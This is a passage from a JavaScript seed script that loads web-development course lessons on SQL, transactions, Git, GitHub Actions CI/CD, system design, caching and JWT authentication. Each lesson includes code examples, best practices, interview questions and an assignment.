1. What is middleware and how does it work?
2. What is the signature of error-handling middleware?
3. How do you protect routes with authentication middleware?

## Assignment
Build a complete middleware stack: request logger (method, path, status, duration), JWT auth middleware, role-based authorization middleware (admin/user), request validator (check required fields), and global error handler.`,30,1),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 5 — Database (m1101-m1105)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m1101","Relational Database Concepts",`# Relational Database Concepts

## Why This Topic Matters
Databases store all application data. Relational databases (PostgreSQL, MySQL) power 90% of web applications. Understanding their concepts prevents design mistakes that are expensive to fix later.

## Learning Objectives
- Understand tables, rows, columns, and keys
- Know the types of relationships
- Understand referential integrity
- Know when to use relational vs NoSQL

## Core Concepts

### Database Objects
\`\`\`
Database
  └── Tables (like spreadsheets)
        └── Rows (records)
              └── Columns (fields with data types)
\`\`\`

### Key Types
| Key | Purpose | Example |
|---|---|---|
| Primary Key | Unique row identifier | users.id |
| Foreign Key | References another table's PK | orders.user_id |
| Unique Key | No duplicates | users.email |
| Composite Key | Multiple columns as PK | (user_id, course_id) |

### Relationships
\`\`\`
One-to-One (1:1)
  User → Profile (each user has one profile)

One-to-Many (1:N) — Most common
  User → Orders (one user has many orders)

Many-to-Many (M:N) — Uses junction table
  Students ↔ Courses
  (via enrollments table: student_id + course_id)
\`\`\`

### Many-to-Many Example
\`\`\`sql
-- Users and Courses with junction table
CREATE TABLE users    (id SERIAL PRIMARY KEY, name TEXT);
CREATE TABLE courses  (id SERIAL PRIMARY KEY, title TEXT);
CREATE TABLE enrollments (
  user_id   INT REFERENCES users(id),
  course_id INT REFERENCES courses(id),
  enrolled_at TIMESTAMP DEFAULT NOW(),
  PRIMARY KEY (user_id, course_id)
);
\`\`\`

### Data Types in PostgreSQL
\`\`\`sql
id      SERIAL / UUID       -- Auto-increment or UUID
name    TEXT / VARCHAR(100) -- String
price   DECIMAL(10,2)       -- Precise decimal
active  BOOLEAN             -- true/false
created TIMESTAMPTZ         -- Date + time + timezone
data    JSONB               -- JSON data
\`\`\`

## Best Practices
- Always define primary keys
- Use foreign keys for referential integrity
- Normalize to avoid data repetition (3NF)
- Use TIMESTAMPTZ not TIMESTAMP for dates

## Common Mistakes
- ❌ Storing multiple values in one column ("PHP,Node,Python")
- ❌ No primary key on tables
- ❌ No foreign key constraints (orphaned records)

## Interview Questions
1. What is a primary key vs foreign key?
2. What is referential integrity?
3. What is a many-to-many relationship?
4. When would you use NoSQL instead of SQL?

## Assignment
Design a complete e-commerce schema: users, products, categories, orders, order_items, and reviews. Draw the ER diagram, define all relationships, write CREATE TABLE statements with proper keys and constraints.`,25,1),

L("m1102","SQL SELECT Queries",`# SQL SELECT Queries

## Why This Topic Matters
SELECT is the most-used SQL command. Every dashboard widget, API response, and report uses SELECT. Mastering it means you can retrieve any data efficiently.

## Learning Objectives
- Write SELECT with WHERE, ORDER BY, LIMIT
- Use all comparison and logical operators
- Filter with LIKE, IN, BETWEEN, IS NULL
- Implement pagination

## Core Concepts

### Basic SELECT
\`\`\`sql
SELECT * FROM users;                        -- All columns (avoid in production)
SELECT id, name, email FROM users;          -- Specific columns
SELECT name AS full_name FROM users;        -- Column alias
SELECT DISTINCT department FROM employees;  -- Unique values
\`\`\`

### WHERE Clause
\`\`\`sql
-- Comparison
SELECT * FROM users WHERE id = 1;
SELECT * FROM users WHERE salary > 50000;
SELECT * FROM users WHERE salary BETWEEN 40000 AND 80000;

-- String matching
SELECT * FROM users WHERE email LIKE '%@gmail.com';  -- Ends with
SELECT * FROM users WHERE name LIKE 'A%';            -- Starts with A
SELECT * FROM users WHERE name ILIKE '%alice%';      -- Case-insensitive

-- NULL checks
SELECT * FROM users WHERE deleted_at IS NULL;
SELECT * FROM users WHERE phone IS NOT NULL;

-- Lists
SELECT * FROM users WHERE role IN ('admin', 'manager');
SELECT * FROM users WHERE id NOT IN (1, 2, 3);

-- Logical
SELECT * FROM users
WHERE (role = 'admin' OR role = 'manager')
  AND is_active = true
  AND created_at > '2024-01-01';
\`\`\`

### Sorting & Pagination
\`\`\`sql
-- Sort
SELECT * FROM products ORDER BY price ASC;
SELECT * FROM products ORDER BY created_at DESC;
SELECT * FROM products ORDER BY category ASC, price ASC;

-- Pagination (page 2, 10 per page)
SELECT * FROM products
ORDER BY id
LIMIT 10 OFFSET 10;  -- Skip 10, take 10

-- Count total for pagination header
SELECT COUNT(*) FROM products WHERE category = 'Electronics';
\`\`\`

### Aggregate Functions
\`\`\`sql
SELECT COUNT(*)          FROM orders;              -- Count rows
SELECT SUM(amount)       FROM orders;              -- Sum
SELECT AVG(amount)       FROM orders;              -- Average
SELECT MAX(amount)       FROM orders;              -- Maximum
SELECT MIN(amount)       FROM orders;              -- Minimum
SELECT ROUND(AVG(salary), 2) FROM employees;      -- Rounded average
\`\`\`

## Best Practices
- Never SELECT * in production code (specify columns)
- Always LIMIT results for large tables
- Use column aliases for calculated fields
- Index columns used in WHERE and ORDER BY

## Common Mistakes
- ❌ SELECT * (slow, fragile when schema changes)
- ❌ Missing quotes: WHERE name = Alice (error)
- ❌ LIKE '%term%' without index (full table scan)

## Interview Questions
1. What is the difference between WHERE and HAVING?
2. How do you implement pagination in SQL?
3. What is the difference between COUNT(*) and COUNT(column)?
4. What does DISTINCT do?

## Assignment
Given employees(id, name, department, salary, hire_date, manager_id): write queries for: employees hired in 2024, top 5 highest-paid per department, departments with avg salary > 75000, and employees without a manager.`,25,1),

L("m1104","SQL Joins",`# SQL Joins

## Why This Topic Matters
Joins are what make relational databases powerful. Almost every real query combines data from multiple tables. Mastering joins is essential for any backend developer.

## Learning Objectives
- Write INNER, LEFT, RIGHT, FULL OUTER joins
- Join multiple tables
- Use table aliases
- Understand when to use each join type

## Core Concepts

### Join Types Visual
\`\`\`
Table A: [1, 2, 3]    Table B: [2, 3, 4]

INNER JOIN:  [2, 3]           -- Only matching rows
LEFT JOIN:   [1, 2, 3]        -- All of A + matches from B
RIGHT JOIN:  [2, 3, 4]        -- Matches from A + All of B
FULL JOIN:   [1, 2, 3, 4]     -- Everything from both
\`\`\`

### INNER JOIN
\`\`\`sql
-- Get orders with user information
SELECT
  o.id AS order_id,
  u.name AS customer_name,
  o.total,
  o.created_at
FROM orders o
INNER JOIN users u ON o.user_id = u.id;

-- Only returns rows where user_id matches a user
\`\`\`

### LEFT JOIN (Most Common)
\`\`\`sql
-- Get ALL users, with their order count (even if they have no orders)
SELECT
  u.name,
  COUNT(o.id) AS order_count,
  COALESCE(SUM(o.total), 0) AS total_spent
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.name
ORDER BY total_spent DESC;
\`\`\`

### Multiple Joins
\`\`\`sql
-- Order details with user, product, and category
SELECT
  o.id AS order_id,
  u.name AS customer,
  p.title AS product,
  c.name AS category,
  oi.quantity,
  oi.price
FROM orders o
JOIN users u         ON o.user_id    = u.id
JOIN order_items oi  ON oi.order_id  = o.id
JOIN products p      ON oi.product_id = p.id
JOIN categories c    ON p.category_id = c.id
WHERE o.status = 'completed'
ORDER BY o.created_at DESC;
\`\`\`

### Self Join
\`\`\`sql
-- Find employees and their managers
SELECT
  e.name AS employee,
  m.name AS manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;
\`\`\`

### JOIN with Aggregation
\`\`\`sql
-- Products never ordered (LEFT JOIN + IS NULL)
SELECT p.title, p.price
FROM products p
LEFT JOIN order_items oi ON p.id = oi.product_id
WHERE oi.id IS NULL;
\`\`\`

## Best Practices
- Always use table aliases for clarity
- Use INNER JOIN when both sides must exist
- Use LEFT JOIN when the right side might not exist
- Explicit JOIN syntax is clearer than WHERE clause joins

## Common Mistakes
- ❌ Cartesian product (forgetting the ON condition)
- ❌ Using WHERE instead of ON for join conditions
- ❌ Not using aliases with multiple tables (ambiguous column names)

## Interview Questions
1. What is the difference between INNER JOIN and LEFT JOIN?
2. What is a self join?
3. What causes a cartesian product?
4. How do you find rows in Table A that have no match in Table B?

## Assignment
Given users, orders, products, and order_items tables: write 5 queries that use different join types. Include: customers with no orders, top products by revenue, monthly sales by category, and customers who bought the same product twice.`,30,1),

L("m1107","Transactions & ACID",`# Transactions & ACID

## Why This Topic Matters
Without transactions, a crash mid-operation can leave your database in an inconsistent state (money debited but not credited). Transactions guarantee data integrity.

## Learning Objectives
- Understand what a transaction is
- Know the ACID properties
- Write transactions in SQL
- Handle transaction errors and rollbacks

## Core Concepts

### The Classic Problem (Bank Transfer)
\`\`\`
Transfer $100 from Alice to Bob:
1. Deduct $100 from Alice  ← What if crash happens here?
2. Add $100 to Bob

Without transaction: Alice loses $100, Bob gets nothing!
With transaction: Either BOTH happen, or NEITHER happens.
\`\`\`

### ACID Properties
| Property | Meaning | Example |
|---|---|---|
| **A**tomicity | All or nothing | Transfer completes fully or not at all |
| **C**onsistency | Database stays valid | Balance can't go negative |
| **I**solation | Transactions don't interfere | Two transfers don't see each other's partial state |
| **D**urability | Committed = permanent | Power cut doesn't lose committed data |

### SQL Transactions
\`\`\`sql
-- Start transaction
BEGIN;

  -- All operations
  UPDATE accounts SET balance = balance - 100 WHERE id = 1;
  UPDATE accounts SET balance = balance + 100 WHERE id = 2;

  -- If something went wrong: ROLLBACK;
  -- If everything OK:
COMMIT;

-- Example with error handling:
BEGIN;
  UPDATE accounts SET balance = balance - 100 WHERE id = 1;

  -- Check constraint
  DO $$
  BEGIN
    IF (SELECT balance FROM accounts WHERE id = 1) < 0 THEN
      RAISE EXCEPTION 'Insufficient funds';
    END IF;
  END;
  $$;

  UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;
\`\`\`

### In Node.js (pg library)
\`\`\`javascript
const client = await pool.connect();
try {
  await client.query('BEGIN');

  await client.query(
    'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
    [amount, fromId]
  );
  await client.query(
    'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
    [amount, toId]
  );

  await client.query('COMMIT');
} catch (err) {
  await client.query('ROLLBACK');
  throw err;
} finally {
  client.release();
}
\`\`\`

### Isolation Levels
\`\`\`sql
-- Higher isolation = fewer bugs but more locking/slower
SET TRANSACTION ISOLATION LEVEL READ COMMITTED;    -- Default PostgreSQL
SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;      -- Strictest
\`\`\`

## Best Practices
- Wrap multi-step operations in transactions
- Keep transactions short (don't hold locks long)
- Always release connections in finally blocks
- Use database constraints (NOT NULL, UNIQUE, CHECK) as a second safety net

## Common Mistakes
- ❌ Not rolling back on error (partial updates remain)
- ❌ Opening transactions without closing them (connection leak)
- ❌ Doing slow operations (HTTP calls) inside a transaction

## Interview Questions
1. What are the ACID properties?
2. What is the difference between COMMIT and ROLLBACK?
3. Why should you keep transactions short?
4. What problems do transaction isolation levels solve?

## Assignment
Build a bank transfer API: POST /transfer with fromAccount, toAccount, amount. Use a transaction to ensure atomicity. Handle: insufficient funds, account not found, and concurrent transfers. Write tests for each failure case.`,30,1),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 6 — Git (m1201-m1205)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m1201","Git Fundamentals",`# Git Fundamentals

## Why This Topic Matters
Git is used by 90%+ of development teams. It tracks every change, enables collaboration, and lets you recover from mistakes. It's non-negotiable for professional development.

## Learning Objectives
- Initialize repositories and understand .git
- Stage and commit changes
- View history and diffs
- Write good commit messages

## Core Concepts

### Three Areas
\`\`\`
Working Directory → Staging Area → Repository
   (modified)          (staged)     (committed)

git add ──────────────────→
                           git commit ──────→

git status   # What's changed?
git diff     # What exactly changed?
\`\`\`

### Essential Commands
\`\`\`bash
git init                      # Create new repo
git clone https://...         # Clone existing repo

git status                    # Show working tree status
git add index.html            # Stage specific file
git add src/                  # Stage directory
git add .                     # Stage everything

git commit -m "Add login page"          # Commit with message
git commit -am "Fix typo"               # Stage tracked + commit

git log                       # Full history
git log --oneline             # One line per commit
git log --oneline --graph     # With branch graph
git log --oneline -10         # Last 10 commits

git diff                      # Unstaged changes
git diff --staged             # Staged changes
git diff abc123 def456        # Between two commits
\`\`\`

### Undoing Changes
\`\`\`bash
git restore file.js           # Discard working dir changes
git restore --staged file.js  # Unstage (keep changes)
git revert abc123             # New commit that undoes abc123
git reset HEAD~1              # Undo last commit, keep changes staged
git reset --hard HEAD~1       # ⚠️  Undo last commit, LOSE changes
\`\`\`

### .gitignore
\`\`\`bash
# .gitignore
node_modules/
.env
.env.local
*.log
dist/
build/
.DS_Store
.idea/
*.test.js.snap
\`\`\`

### Good vs Bad Commits
\`\`\`bash
# ❌ Useless
git commit -m "fix"
git commit -m "wip"
git commit -m "changes"

# ✅ Professional (imperative mood, specific)
git commit -m "Add JWT authentication to login endpoint"
git commit -m "Fix null reference error in payment processor"
git commit -m "Refactor user service to use repository pattern"
git commit -m "Remove deprecated getUserById API"
\`\`\`

## Best Practices
- Commit early and often (small, focused commits)
- Write meaningful commit messages
- Never commit .env or node_modules
- Use git diff before committing to review changes

## Common Mistakes
- ❌ One massive commit instead of many small ones
- ❌ Committing sensitive data (.env, passwords)
- ❌ Vague commit messages

## Interview Questions
1. What is the difference between git add and git commit?
2. What is the staging area for?
3. What is the difference between git reset and git revert?
4. How do you undo the last commit without losing changes?

## Assignment
Create a project, make 8+ meaningful commits showing a real feature being built (setup → HTML → CSS → JS → tests → refactor → bug fix → final). Write proper commit messages. View the log and use git diff between commits.`,20,1),

L("m1203","Branching & Merging",`# Branching & Merging

## Why This Topic Matters
Branches let teams work on multiple features simultaneously without conflicts. It's how all professional teams work — every feature, bug fix, and experiment gets its own branch.

## Learning Objectives
- Create, switch, and delete branches
- Merge branches with fast-forward and 3-way merges
- Resolve merge conflicts confidently
- Use branch naming conventions

## Core Concepts

### Branch Diagram
\`\`\`
main:    A → B → C ──────────────→ H (merge commit)
                  \\               /
feature:           D → E → F → G
\`\`\`

### Branch Commands
\`\`\`bash
git branch                          # List branches (* = current)
git branch feature/login            # Create branch
git checkout feature/login          # Switch to branch
git switch feature/login            # Modern syntax
git checkout -b feature/login       # Create AND switch
git switch -c feature/login         # Modern: create AND switch

git branch -d feature/login         # Delete merged branch
git branch -D feature/login         # Force delete

git branch -a                       # List all (local + remote)
git branch -m old-name new-name     # Rename
\`\`\`

### Merging
\`\`\`bash
git checkout main          # Switch to target branch
git merge feature/login    # Merge feature into main

# Fast-forward (no divergence):
# Pointer just moves forward — no merge commit

# 3-way merge (both branches have new commits):
# Creates a merge commit
git merge --no-ff feature/login    # Always create merge commit
\`\`\`

### Resolving Merge Conflicts
\`\`\`bash
# After: CONFLICT (content): Merge conflict in app.js

# Open the file and you'll see:
<<<<<<< HEAD
const API_URL = 'http://localhost:3000';
=======
const API_URL = 'https://api.production.com';
>>>>>>> feature/config

# Fix: choose one or combine
const API_URL = process.env.API_URL || 'http://localhost:3000';

# Then mark resolved:
git add app.js
git commit    # Complete the merge
\`\`\`

### Branch Naming Conventions
\`\`\`bash
feature/user-authentication
feature/payment-integration
bugfix/login-redirect-loop
hotfix/security-vulnerability
release/v2.0.0
chore/update-dependencies
docs/api-documentation
\`\`\`

## Best Practices
- Never commit directly to main
- Keep branches short-lived (max 1-2 days)
- Delete branches after merging
- Pull latest main before creating a new branch

## Common Mistakes
- ❌ Long-lived branches (too much divergence → massive conflicts)
- ❌ Working directly on main
- ❌ Accepting both sides of a conflict without reviewing

## Interview Questions
1. What is a branch in git?
2. What is the difference between merge and rebase?
3. What is a merge conflict and how do you resolve it?
4. What is a fast-forward merge?

## Assignment
Simulate a team: 3 branches from main (feature/header, feature/footer, bugfix/typo). Add changes that create a conflict. Resolve the conflict, merge all three to main. View the resulting history with git log --graph.`,30,1),

L("m1208","GitHub Actions & CI/CD",`# GitHub Actions & CI/CD

## Why This Topic Matters
CI/CD automates testing and deployment. Every professional team uses it. GitHub Actions is the most accessible CI/CD tool — it's free for public repos and built into GitHub.

## Learning Objectives
- Understand CI/CD concepts
- Create GitHub Actions workflows
- Run tests automatically on push
- Deploy on merge to main

## Core Concepts

### CI/CD Pipeline
\`\`\`
Developer pushes code
         ↓
GitHub Actions triggered
         ↓
Install dependencies
         ↓
Run linting
         ↓
Run tests
         ↓
Build application        ← CI (Continuous Integration)
         ↓
Deploy to staging/prod   ← CD (Continuous Deployment)
         ↓
Notify team
\`\`\`

### Basic Workflow File
\`\`\`yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run linting
        run: npm run lint

      - name: Run tests
        run: npm test

      - name: Build
        run: npm run build
\`\`\`

### Deploy to Production Workflow
\`\`\`yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    needs: [test]  # Only deploy if tests pass

    steps:
      - uses: actions/checkout@v4

      - name: Deploy to server
        env:
          SSH_KEY: \${{ secrets.SSH_PRIVATE_KEY }}
          HOST: \${{ secrets.SERVER_HOST }}
        run: |
          echo "\$SSH_KEY" > key.pem
          chmod 600 key.pem
          ssh -i key.pem user@\$HOST "cd /app && git pull && npm ci && pm2 restart app"
\`\`\`

### Secrets Management
\`\`\`yaml
# Store secrets in GitHub → Settings → Secrets
# Access in workflow:
env:
  DATABASE_URL: \${{ secrets.DATABASE_URL }}
  JWT_SECRET: \${{ secrets.JWT_SECRET }}
\`\`\`

### Status Badges
\`\`\`markdown
# In README.md
![CI](https://github.com/username/repo/actions/workflows/ci.yml/badge.svg)
\`\`\`

## Best Practices
- Run tests on every PR (not just main)
- Cache npm dependencies (cache: 'npm')
- Use secrets for sensitive values — never hardcode
- Fail fast: lint before test before build

## Common Mistakes
- ❌ Deploying without running tests first
- ❌ Hardcoding secrets in workflow files
- ❌ Not caching dependencies (slow builds)

## Interview Questions
1. What is the difference between CI and CD?
2. What is a GitHub Actions workflow?
3. How do you store secrets securely in GitHub Actions?

## Assignment
Create a GitHub repository with a Node.js API. Write a CI/CD pipeline that: runs on every PR, installs dependencies, runs lint (ESLint), runs tests (Jest), and on merge to main, deploys to a hosting platform (Render/Railway/Fly.io).`,30,1),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 7 — System Design (m1401-m1404)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m1401","System Design Fundamentals",`# System Design Fundamentals

## Why This Topic Matters
System design is tested in senior developer interviews. More practically, bad design choices made early are exponentially expensive to fix at scale.

## Learning Objectives
- Understand the goals and constraints in system design
- Know key non-functional requirements
- Approach design problems systematically
- Do basic capacity estimation

## Core Concepts

### Functional vs Non-Functional Requirements
\`\`\`
Functional:     WHAT the system does
  "Users can post tweets"
  "Users can follow other users"
  "Timeline shows latest 200 posts"

Non-Functional: HOW WELL it does it
  Scalability:  Handles 500M users
  Availability: 99.99% uptime (4 min downtime/year)
  Latency:      < 200ms for timeline
  Consistency:  Eventually consistent (ok to see stale data)
  Durability:   No data loss
\`\`\`

### Key Numbers to Know
\`\`\`
Time:
  1ms = 1,000 microseconds
  L1 cache hit:       0.5ns
  RAM access:         100ns
  SSD sequential:     1MB in 1ms
  Network round trip: 150ms (cross-continent)

Scale:
  1M requests/day = ~12 req/sec
  1B requests/day = ~11,600 req/sec

Storage:
  1 tweet (~300 bytes) × 500M tweets = 150GB
  1 photo (1MB) × 1M photos/day = 1TB/day
\`\`\`

### Common Architecture Components
\`\`\`
[Users] → [CDN] → [Load Balancer]
                        ↓
              [App Servers × N]
                 ↓          ↓
         [Cache]       [Database]
         (Redis)     (PostgreSQL)
              ↓
       [Message Queue]
       (Kafka/RabbitMQ)
              ↓
       [Background Workers]
\`\`\`

### System Design Framework (for interviews)
\`\`\`
Step 1 - Clarify (5 min)
  "How many users?" "Which features exactly?" "Latency requirements?"

Step 2 - Estimate Scale (5 min)
  DAU, requests/sec, storage/day

Step 3 - High-Level Design (15 min)
  Draw components, APIs, database

Step 4 - Deep Dive (15 min)
  Bottlenecks, database design, caching

Step 5 - Trade-offs (5 min)
  "What breaks first? How would you scale it?"
\`\`\`

## Best Practices
- Start simple — design for current scale, plan for future
- Every decision is a trade-off (consistency vs availability)
- There is no single right answer

## Interview Questions
1. What is the difference between latency and throughput?
2. What is availability expressed as "nines"? (99.9% = 3 nines)
3. What is the difference between horizontal and vertical scaling?

## Assignment
Design a URL shortener (bit.ly): list 5 functional requirements, estimate scale (1M shortens/day, 100M redirects/day), sketch the high-level architecture, design the database schema, and explain how the short code is generated.`,40,1),

L("m1402","Scalability & Load Balancing",`# Scalability & Load Balancing

## Why This Topic Matters
Any successful application will eventually need to handle more traffic than one server can handle. Understanding scaling patterns is what separates mid-level from senior engineers.

## Learning Objectives
- Understand horizontal vs vertical scaling
- Know how load balancers work
- Understand different load balancing strategies
- Know about stateless vs stateful services

## Core Concepts

### Vertical Scaling (Scale Up)
\`\`\`
Single server:  2 CPU, 8GB RAM, 100 req/sec
After upgrade:  16 CPU, 64GB RAM, 800 req/sec

✅ Pros: Simple, no code changes needed
❌ Cons: Has hardware limits, single point of failure, expensive
\`\`\`

### Horizontal Scaling (Scale Out)
\`\`\`
1 server → 10 servers → 100 servers

[Load Balancer]
     ↓ ↓ ↓ ↓
  [S1][S2][S3][S4]  ← Identical application servers

✅ Pros: Theoretically unlimited scale, fault tolerant
❌ Cons: More complex, need stateless apps
\`\`\`

### Load Balancing Algorithms
\`\`\`
Round Robin:     Request 1→S1, 2→S2, 3→S3, 4→S1...
                 Simple, equal distribution

Least Connections: Route to server with fewest active connections
                   Better for varying request lengths

IP Hash:         Same client always hits same server
                 Useful for session affinity

Weighted Round Robin: Powerful servers get more requests
\`\`\`

### Stateless Architecture (Required for Horizontal Scaling)
\`\`\`javascript
// ❌ Stateful: session stored in server memory
app.post('/login', (req, res) => {
  req.session.userId = user.id; // Only on THIS server!
  // If load balancer sends next request to Server 2 → user not logged in
});

// ✅ Stateless: session stored in shared store (Redis/JWT)
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: user.id }, SECRET);
  res.json({ token }); // Client sends token with every request
  // Works on ANY server!
});
\`\`\`

### Auto-Scaling
\`\`\`
CPU > 70%? → Add a new server
CPU < 30%? → Remove a server
Traffic spike at 9am? → Pre-scale (scheduled scaling)
\`\`\`

### Health Checks
\`\`\`javascript
// Load balancer pings this endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    uptime: process.uptime(),
    memory: process.memoryUsage()
  });
});
// If unhealthy → load balancer removes server from rotation
\`\`\`

## Best Practices
- Design stateless services from day one
- Implement health check endpoints
- Use connection pooling for databases
- Cache aggressively to reduce database load

## Common Mistakes
- ❌ Storing session in server memory (breaks horizontal scaling)
- ❌ Vertical scaling as a permanent solution
- ❌ No health checks (load balancer sends traffic to dead servers)

## Interview Questions
1. What is the difference between horizontal and vertical scaling?
2. What is a load balancer and what does it do?
3. What does "stateless" mean and why is it important for scaling?
4. What is auto-scaling?

## Assignment
Design the architecture for an e-commerce website that needs to handle 10x traffic during Black Friday. Start with current architecture (1 server), then design scaled architecture. Address: web servers, database, cache, CDN, and queue for order processing.`,35,1),

L("m1404","Caching Strategies",`# Caching Strategies

## Why This Topic Matters
Caching is the single most effective way to improve performance. A cache hit is 100x-1000x faster than a database query. Understanding caching is essential for building fast systems.

## Learning Objectives
- Understand what caching is and why it works
- Know different caching strategies
- Understand cache invalidation
- Use Redis for application-level caching

## Core Concepts

### Why Caching Works
\`\`\`
Without cache:   Request → App Server → Database → 100ms
With cache hit:  Request → App Server → Cache → 1ms
                                                100x faster!

80/20 rule: 80% of requests access 20% of data
→ Cache the 20% → serve 80% of traffic from memory
\`\`\`

### Caching Layers
\`\`\`
Browser Cache   → Static assets (CSS, JS, images)
CDN Cache       → Static + dynamic content at edge
Application Cache (Redis) → Database query results, sessions
Database Cache  → Query plan cache, buffer pool
\`\`\`

### Cache Strategies

#### Cache-Aside (Lazy Loading) — Most Common
\`\`\`javascript
async function getUser(id) {
  // 1. Check cache first
  const cached = await redis.get(\`user:\${id}\`);
  if (cached) return JSON.parse(cached);

  // 2. Cache miss → fetch from DB
  const user = await db.query('SELECT * FROM users WHERE id = $1', [id]);

  // 3. Store in cache for next time
  await redis.setex(\`user:\${id}\`, 3600, JSON.stringify(user)); // TTL: 1 hour

  return user;
}
\`\`\`

#### Write-Through — Keep Cache Consistent
\`\`\`javascript
async function updateUser(id, data) {
  // 1. Update database
  const user = await db.query('UPDATE users SET ... WHERE id = $1', [id]);

  // 2. Update cache immediately
  await redis.setex(\`user:\${id}\`, 3600, JSON.stringify(user));

  return user;
}
\`\`\`

#### Cache Invalidation — The Hard Part
\`\`\`javascript
// Delete cache when data changes
async function deleteUser(id) {
  await db.query('DELETE FROM users WHERE id = $1', [id]);
  await redis.del(\`user:\${id}\`);           // Invalidate specific key
  await redis.del('users:list');            // Invalidate list cache too
}

// Tag-based invalidation
await redis.del(\`user:\${id}\`, \`user:\${id}:posts\`, \`user:\${id}:profile\`);
\`\`\`

### Cache Pitfalls
\`\`\`
Cache Stampede: Cache expires → 1000 requests all hit DB simultaneously
Solution: Use mutex lock or probabilistic early expiration

Cache Poisoning: Attacker stores malicious data in cache
Solution: Validate all cached data, use namespaced keys

Stale Data: Cache shows old data after update
Solution: Appropriate TTLs, write-through, or event-based invalidation
\`\`\`

### Redis Commands
\`\`\`javascript
// Set with TTL
await redis.set('key', 'value', 'EX', 3600);  // 1 hour TTL
await redis.setex('key', 3600, 'value');       // Equivalent

// Get
const value = await redis.get('key');          // null if not found

// Delete
await redis.del('key1', 'key2');

// Check TTL
const ttl = await redis.ttl('key');            // -1 = no TTL, -2 = not found
\`\`\`

## Best Practices
- Cache expensive queries (complex joins, aggregations)
- Set appropriate TTLs (shorter for frequently changing data)
- Use cache namespacing: "user:123:profile" not just "123"
- Monitor cache hit rates (aim for 80%+)

## Common Mistakes
- ❌ Caching everything (wastes memory)
- ❌ No TTL (stale data lives forever)
- ❌ Not invalidating on writes (users see stale data)

## Interview Questions
1. What is the difference between cache-aside and write-through?
2. What is cache invalidation and why is it hard?
3. What is a cache stampede?
4. What is the typical cache hit ratio you'd target?

## Assignment
Add Redis caching to an Express + PostgreSQL API: cache individual user lookups (1 hour TTL), cache user list with pagination (5 min TTL), invalidate properly on create/update/delete. Measure and log cache hit vs miss rates.`,35,1),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 8 — Auth & Security (m1004-m1008)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m1004","JSON Web Tokens (JWT)",`# JSON Web Tokens (JWT)

## Why This Topic Matters
JWT is the industry standard for stateless API authentication. Understanding it deeply — including its security implications — is essential for any backend developer.

## Learning Objectives
- Understand JWT structure and the signing process
- Implement JWT login and protected routes
- Use refresh tokens for longer sessions
- Know JWT security best practices

## Core Concepts

### JWT Structure
\`\`\`
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.abc123
       ↑                      ↑              ↑
   Header (b64)          Payload (b64)   Signature

Header:    { "alg": "HS256", "typ": "JWT" }
Payload:   { "userId": 1, "role": "admin", "exp": 1735689600 }
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), SECRET)
\`\`\`

### Important: Payload is NOT encrypted — just base64 encoded!
\`\`\`javascript
// Anyone can decode: atob(token.split('.')[1])
// → { userId: 1, role: "admin", exp: ... }
// NEVER put passwords or sensitive data in JWT payload
\`\`\`

### Complete JWT Auth Flow
\`\`\`javascript
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// LOGIN → issue token
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await db.findByEmail(email);
  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }   // Short-lived
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }    // Long-lived
  );

  // Refresh token in httpOnly cookie (XSS safe)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });

  res.json({ accessToken });
});

// MIDDLEWARE → verify token
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired', code: 'EXPIRED' });
    }
    res.status(401).json({ error: 'Invalid token' });
  }
}

// REFRESH → issue new access token
app.post('/api/auth/refresh', (req, res) => {
  const { refreshToken } = req.cookies;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
    const accessToken = jwt.sign(
      { userId: payload.userId },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );
    res.json({ accessToken });
  } catch {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
\`\`\`

## Best Practices
- Short access token TTL (15-60 min)
- Store refresh tokens in httpOnly cookies
- Rotate refresh tokens on use
- Use environment variables for secrets
- Log failed authentication attempts

## Common Mistakes
- ❌ Long-lived access tokens (no way to invalidate)
- ❌ Storing JWT in localStorage (XSS vulnerable)
- ❌ Using weak/empty secrets
- ❌ Putting sensitive data in payload

## Interview Questions
1. What are the three parts of a JWT?
